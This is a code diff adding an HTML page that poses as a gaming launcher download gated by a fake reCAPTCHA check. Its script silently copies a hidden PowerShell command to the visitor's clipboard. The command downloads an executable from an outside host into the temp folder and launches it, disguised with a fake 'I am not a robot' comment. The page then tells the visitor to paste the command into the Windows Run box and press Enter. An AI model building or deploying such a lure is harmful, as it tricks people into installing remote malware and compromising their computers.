@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Launcher Download - reCAPTCHA Verification</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .checkbox-window {
+            height: 70px;
+            width: 280px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+
+        .checkbox-container {
+            width: 24px;
+            height: 24px;
+        }
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 20px 0 0 10px;
+            outline: none;
+            font-family: Roboto, Helvetica, Arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 38px;
+            bottom: 4px;
+            font-size: 14px;
+            color: #282727;
+            display: inline-block;
+            line-height: 24px;
+            transform: translateX(-50%);
+        }
+
+        .captcha-logo {
+            position: relative;
+            left: 225px;
+            bottom: 32px;
+            width: 32px;
+            height: 32px;
+            vertical-align: middle;
+            padding-bottom: 2px;
+        }
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 7px;
+            text-align: center;
+            bottom: 38px;
+            left: 108px;
+        }
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -82px;
+            left: 10px;
+            height: 18px;
+            width: 18px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .verify-window {
+            font-family: Roboto, Helvetica, Arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 300px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;
+            padding-left: 0;
+        }
+
+        ol li {
+            counter-increment: item;
+            margin-bottom: 8px;
+        }
+
+        ol li::before {
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 8px;
+            margin-left: 8px;
+        }
+
+        .verify-container {
+            padding: 6px;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 12px 12px 20px 12px;
+            color: #fff;
+        }
+
+        .verify-header-text-small {
+            font-size: 12px;
+            line-height: normal;
+        }
+
+        .verify-header-text-medium {
+            font-size: 14px;
+        }
+
+        .verify-header-text-big {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .verify-main {
+            padding: 4px;
+            color: #111;
+            font-size: 12px;
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 8px 6px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 90px;
+            font-size: 12px;
+        }
+
+        .verify-footer-left {
+            padding: 4px;
+        }
+
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 10px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 12px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+
+        .verify-verify-button.enabled {
+            background-color: #1A73E8;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <!-- Hero Section -->
+    <section class="bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-20">
+        <div class="container mx-auto px-4 text-center">
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">Download Our Launcher</h1>
+            <p class="text-lg md:text-xl mb-8">Experience seamless gaming with our high-performance launcher.</p>
+            <div class="flex justify-center items-center space-x-4">
+                <button id="download-btn" class="bg-white text-blue-600 font-semibold py-3 px-6 rounded-lg opacity-50 cursor-not-allowed" disabled>
+                    Download Now
+                </button>
+                <div id="checkbox-window" class="checkbox-window">
+                    <div class="checkbox-container">
+                        <button type="button" id="checkbox" class="checkbox"></button>
+                    </div>
+                    <p class="im-not-a-robot">I'm not a robot</p>
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="captcha-logo" alt="reCAPTCHA Logo">
+                    <p class="checkbox-desc">
+                        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
+                        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                    </p>
+                    <img class="spinner" alt="" id="spinner">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Verification Window -->
+    <div id="verify-window" class="verify-window">
+        <div class="verify-container">
+            <header class="verify-header">
+                <span class="verify-header-text-medium block">Complete these</span>
+                <span class="verify-header-text-big block">Verification Steps</span>
+            </header>
+            <main class="verify-main">
+                <p>To better prove you are not a robot, please:</p>
+                <ol>
+                    <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+                    <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+                    <li>Press <b>Enter</b> on your keyboard to finish.</li>
+                </ol>
+                <p>You will observe and agree:<br>
+                    <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"</code>
+                </p>
+            </main>
+            <footer class="verify-container verify-footer">
+                <div class="verify-footer-left">Perform the steps above to finish verification.</div>
+                <button type="button" class="verify-verify-button" id="verify-verify-button" disabled>Verify</button>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Features Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12">Why Choose Our Launcher?</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="text-center">
+                    <i class="fas fa-rocket text-4xl text-blue-600 mb-4"></i>
+                    <h3 class="text-xl font-semibold mb-2">Fast Performance</h3>
+                    <p>Optimized for speed, ensuring quick load times and smooth gameplay.</p>
+                </div>
+                <div class="text-center">
+                    <i class="fas fa-shield-alt text-4xl text-blue-600 mb-4"></i>
+                    <h3 class="text-xl font-semibold mb-2">Secure</h3>
+                    <p>Built-in security features to protect your gaming experience.</p>
+                </div>
+                <div class="text-center">
+                    <i class="fas fa-users text-4xl text-blue-600 mb-4"></i>
+                    <h3 class="text-xl font-semibold mb-2">Community Driven</h3>
+                    <p>Join a vibrant community with regular updates and support.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-8">
+        <div class="container mx-auto px-4 text-center">
+            <p>© 2025 Launcher Inc. All rights reserved.</p>
+            <div class="mt-4">
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Privacy Policy</a>
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Terms of Service</a>
+                <a href="#" class="text-gray-400 hover:text-white mx-2">Contact Us</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifyWindow = document.getElementById("verify-window");
+        let verifyBtn = document.getElementById("verify-verify-button");
+        let downloadBtn = document.getElementById("download-btn");
+
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifyWindow) && isVerifyWindowVisible()) {
+                        closeVerifyWindow();
+                    }
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
+                verifyBtn.addEventListener("click", function () {
+                    if (!verifyBtn.disabled) {
+                        closeVerifyWindow();
+                        enableDownload();
+                    }
+                });
+            }
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function () {
+                showCaptchaLoading();
+            }, 500);
+            setTimeout(function () {
+                showVerifyWindow();
+            }, 900);
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function () {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "20px 0 0 10px";
+            checkboxBtn.style.opacity = "1";
+            checkboxBtn.style.visibility = "visible";
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "22px";
+            checkboxBtn.style.marginTop = "30px";
+            checkboxBtn.style.opacity = "0";
+            checkboxBtn.style.visibility = "hidden";
+        }
+
+        function generateRandomNumber() {
+            const min = 1000;
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeVerifyWindow() {
+            verifyWindow.style.display = "none";
+            verifyWindow.style.visibility = "hidden";
+            verifyWindow.style.opacity = "0";
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+        }
+
+        function isVerifyWindowVisible() {
+            return verifyWindow.style.display !== "none" && verifyWindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy) {
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id) {
+            const suffix = " # ";
+            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: ";
+            const end = "''";
+            const textToCopy = commandToRun + suffix + ploy + verification_id + end;
+            setClipboardCopyData(textToCopy);
+        }
+
+        function showVerifyWindow() {
+            verifyWindow.style.display = "block";
+            verifyWindow.style.visibility = "visible";
+            verifyWindow.style.opacity = "1";
+            verifyWindow.style.top = checkboxWindow.offsetTop - 70 + "px";
+            verifyWindow.style.left = checkboxWindow.offsetLeft + 50 + "px";
+
+            if (verifyWindow.offsetTop < 5) {
+                verifyWindow.style.top = "5px";
+            }
+
+            if (verifyWindow.offsetLeft + verifyWindow.offsetWidth > window.innerWidth - 10) {
+                verifyWindow.style.left = checkboxWindow.offsetLeft - 10 + "px";
+            }
+
+            var verification_id = generateRandomNumber();
+            document.getElementById('verification-id').textContent = verification_id;
+
+            const commandToRun = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://gitzdownloadkm.icu/' -OutFile \\"$env:TEMP\\launcher.exe\\"; Start-Process \\"$env:TEMP\\launcher.exe\\""`;
+            stageClipboard(commandToRun, verification_id);
+
+            // Enable verify button after a delay (simulating verification steps completion)
+            setTimeout(() => {
+                verifyBtn.disabled = false;
+                verifyBtn.classList.add("enabled");
+            }, 2000);
+        }
+
+        function enableDownload() {
+            downloadBtn.disabled = false;
+            downloadBtn.classList.remove("opacity-50", "cursor-not-allowed");
+            downloadBtn.classList.add("hover:bg-blue-600", "hover:text-white");
+            downloadBtn.setAttribute("onclick", "window.location.href='launcher-download.zip'");
+        }
+
+        addCaptchaListeners();
+    </script>
+</body>
+</html>
